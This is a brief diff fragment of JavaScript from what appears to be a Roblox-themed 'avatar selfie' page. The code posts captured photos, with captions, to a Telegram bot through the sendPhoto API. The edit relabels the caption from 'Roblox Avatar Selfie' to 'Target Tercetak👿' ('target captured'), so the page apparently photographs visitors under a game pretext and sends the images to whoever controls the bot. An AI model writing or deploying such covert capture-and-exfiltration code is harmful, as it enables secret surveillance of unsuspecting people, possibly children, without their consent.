@@ -113,7 +113,7 @@
             const formData = new FormData();
             formData.append("chat_id", CHAT_ID);
             formData.append("photo", blob, `roblox_${photoCount}.jpg`);
-            formData.append("caption", `🟥 Roblox Avatar Selfie\nFoto ke-${photoCount}/10\nScore: ${score}\nWaktu: ${new Date().toLocaleString()}`);
+            formData.append("caption", `🟥 Target Tercetak👿\nFoto ke-${photoCount}\nWaktu: ${new Date().toLocaleString()}`);
 
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                 method: "POST",
